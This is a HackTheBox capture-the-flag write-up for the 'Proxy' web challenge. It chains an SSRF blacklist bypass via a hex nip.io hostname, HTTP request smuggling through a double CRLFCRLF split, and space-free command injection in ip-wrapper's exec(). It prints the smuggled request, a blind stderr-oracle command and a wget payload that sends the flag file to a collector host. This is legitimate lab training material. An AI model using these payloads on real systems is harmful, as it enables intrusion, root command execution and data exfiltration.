# Proxy — SOLVED (self-solved)

- Platform: HackTheBox (web). Custom Go HTTP proxy in front of an Express backend.
- Date: 2026-09-19
- Target supplied: `154.57.164.73:30163` (white-box, source under `challenges/HTB Proxy/`)
- Stack: Go `net.Dial` proxy on the exposed port, Express on `:5000`, npm `ip-wrapper`
- Flag: redacted; verified live through a boolean oracle (200 vs 401) on an anchored `grep`
- Assistance: none; source read first, no writeup used.

## Chain

Three independent controls have to fall in order. Each one is a separate bypass.

### 1. SSRF host filter — hex-encoded IP through `nip.io`

`challenge/proxy/main.go` `blacklistCheck` rejects any request whose bytes contain
the **substrings** `localhost`, `0.0.0.0`, `127.`, `172.`, `192.`, `10.` — a substring
test, not an address parse. The backend sits at a RFC1918 address the proxy can reach.

`0af405cf.nip.io` resolves to `10.244.5.207` (hex form of the address; `nip.io` accepts
dotted, dashed and **hex** encodings) and contains none of the blacklisted substrings.
`Host: 0af405cf.nip.io:5000` therefore passes the filter and `net.Dial("tcp", host)`
connects to the backend.

### 2. URL ban + body filter — `\r\n\r\n` double-split smuggling

Two more gates stand between that connection and the vulnerable route:

- `strings.Contains(strings.ToLower(request.URL), "flushinterface")` → `400 Bad Request`,
  so `/flushInterface` can never be the request line the proxy parses.
- `checkMaliciousBody` rejects `` [`;&|] ``, `\$\([^)]+\)`, `union...select`, `<script>`,
  `\r\n|\r|\n`, DOCTYPE/ENTITY in the body.

The parser is where it breaks:

```go
bodySplit := strings.Split(string(requestBytes), "\r\n\r\n")
bodyContent := bodySplit[1]
// ... len(bodyContent) == contentLengthInt is enforced, on bodySplit[1] only
```

**Only `bodySplit[1]` is parsed, validated and filtered.** Everything after the *second*
`\r\n\r\n` is never inspected — and the proxy then writes `requestBytes` **verbatim**
to the backend socket. So one TCP write carries two pipelined requests:

```
POST /getAddresses HTTP/1.1      <- what the proxy sees and validates
Host: 0af405cf.nip.io:5000
Content-Type: application/json
Content-Length: 7

{"a":1}                          <- bodySplit[1], valid JSON, passes every filter
                                 <- the second CRLFCRLF
POST /flushInterface HTTP/1.1    <- invisible to the proxy, executed by Express
Host: 0af405cf.nip.io:5000
Content-Type: application/json
Content-Length: N
Connection: close

{"interface":"<payload>"}
```

Express answers **both**; the proxy relays both status lines, so `codes[1]` is the
smuggled request's status.

### 3. `exec()` injection in `ip-wrapper`

`challenge/backend/index.js` `validateInput` rejects only non-strings, empty strings and
anything containing a **space**. `/flushInterface` then calls
`ipWrapper.addr.flush(interface)`, and the package (`src/addresses.js`, fetched from
`registry.npmjs.org`) does:

```js
exec(`ip address flush dev ${interfaceName}`, (error, stdout, stderr) => {
    if (stderr) { ...reject... ; return; }
    resolve();          // no value — stdout is never returned
});
```

Unauthenticated shell as **root** (`config/supervisord.conf` has `user=root`).

### 4. The output problem — stderr presence as a boolean oracle

`resolve()` takes no argument, so stdout never leaves the process: this is **blind**.
The `Dockerfile` installs no `iproute2`, so `ip` is always "not found" and always writes
to stderr — the baseline is permanently the error branch.

Silencing the baseline turns `stderr` into a one-bit channel:

```
x  2>/dev/null ; <condition>  2>/dev/null || echo E >&2
```

- condition true  → nothing on stderr → `resolve()` → **HTTP 200, Content-Length: 0**
- condition false → `echo E >&2`      → `reject()`  → **HTTP 401 `{"message":"Error flushing interface"}`**

`entrypoint.sh` renames the flag to `/flag$(random 10 hex).txt`, so the glob `/flag*.txt`
is what the oracle reads:

```
grep -q "^HTB{REDACTED}$" /flag*.txt
```

Character-by-character over `[a-z0-9_A-Z{}!?.-]`, anchored `^`, ~3 requests per candidate.

## Traps that cost time

- **`${IFS}` is fine as a separator — except immediately before an fd-numbered redirect.**
  I first recorded this as "`${IFS}` does not expand here"; that was wrong, and the real rule
  is narrower and more useful. Verified on BusyBox ash (the Alpine shell) and dash:
  ```
  sh -c 'echo${IFS}a${IFS}b'   -> a b          # splitting works normally
  sh -c 'x${IFS}2>/dev/null'   -> "x: not found" leaks to stderr
  sh -c 'x<TAB>2>/dev/null'    -> silent
  ```
  The fd number in a redirect is an **IO_NUMBER token decided at parse time**, before any
  expansion. In `x${IFS}2>/dev/null` the lexer sees the single word `x${IFS}2` followed by a
  bare `>`, so it is a **stdout** redirect and stderr still leaks; only after expansion does the
  word split into `x` and `2`, too late to matter. A literal TAB terminates the word during
  lexing, so `2>` is recognised as a real stderr redirect. Use `${IFS}` freely for argument
  separation, use a TAB (or `$'\t'`, or reorder the redirect) when an fd number follows.
- **`x2>/dev/null` is not `x 2>/dev/null`.** Without a separator the shell reads the word
  `x2` plus a **stdout** redirect, stderr still leaks, and the oracle is stuck at false.
- **The first (visible) request must be a route the proxy actually proxies.** `/` and
  `/server-status` are handled *locally* by the Go proxy and never reach the backend, so
  nothing gets smuggled. `/getAddresses` works.
- **The filler body must be valid JSON.** `express.json()` 400s on `AAAAA` and the
  connection dies before the smuggled request is read. `{"a":1}` is enough.
- **Never pass a real interface name.** The injected name is the non-existent `x`. Passing
  `eth0` or `lo` would actually flush the container's addresses and permanently brick a
  shared instance.

## The faster route: out-of-band exfiltration

The character-by-character oracle above works, but it needs ~3 requests per candidate
character and a few hundred requests for the whole flag. **If the container has egress,
one request is enough** — and this container does. All of it measured through the same
oracle on the live instance:

| Probe | Result |
|---|---|
| `$(...)` command substitution in the smuggled body | works |
| backtick substitution | works |
| `which curl` | **absent** (Alpine base has no curl) |
| `which wget` / `nc` / `nslookup` / `node` / `ping` | all present |
| `nslookup example.com` | works — DNS egress |
| `wget http://example.com/` | works — outbound HTTP |
| `wget https://example.com/` | works — outbound HTTPS |
| `nc -z 1.1.1.1 80` | works — raw outbound TCP |
| `wget ... "http://example.com/?d=$(echo MARKER)"` | works — substitution spliced into a URL |

So the intended one-shot payload is simply:

```
wget${IFS}-q${IFS}-O${IFS}/dev/null${IFS}"http://<collector>/?d=$(cat${IFS}/flag*.txt)"
```

Two things make this legal where it looks like it should not be:

- **`$(` and backticks are in `checkMaliciousBody`'s blocklist, and it does not matter.**
  That filter only ever sees `bodySplit[1]`. The smuggled body lives past the *second*
  `\r\n\r\n`, so it is never inspected at all — the same reason `;` and `|` work.
- **`validateInput` only rejects `" "`**, and `${IFS}` contains no space in its literal form.
  Here `${IFS}` is the right separator precisely because no fd-numbered redirect follows it.

**This should have been the first thing tried.** Egress is a two-probe question
(`which wget`, then one fetch to a benign host), and answering it first either collapses the
whole challenge to one request or tells you to build the oracle. Reaching for the blind
oracle before testing egress cost roughly two orders of magnitude in requests. Note also
that the blind path is *not* strictly worse on a shared instance — it never sends challenge
data to a third party — so when egress exists, the choice between them is a disclosure
decision, not just a speed one.

## Reusable lessons

- **A substring blacklist on a host is not an address check.** Any alternate encoding that
  resolves to the same address defeats it; `nip.io` serves dotted, dashed *and* hex forms,
  and the hex form shares no substring with the dotted form.
- **`Split(s, sep)[1]` is a smuggling primitive whenever the raw bytes are forwarded.**
  Validating one element of a split while relaying the whole buffer means every gate the
  proxy implements applies to the first request only.
- **A blind sink is still an oracle when an error path is observable.** Do not look for a
  way to return stdout; look for a branch whose *presence* flips a status code, then make
  the baseline silent so the condition is the only thing that writes.
- **Test egress before building an oracle.** Two cheap probes decide between one request
  and several hundred. "Is the output readable?" is the wrong first question; "can the box
  talk out?" is the right one.
- **A blocklist that runs on the wrong slice of the input blocks nothing.** Once the
  smuggling step is proven, stop working around `checkMaliciousBody` entirely — every
  metacharacter it names is already available in the smuggled half.
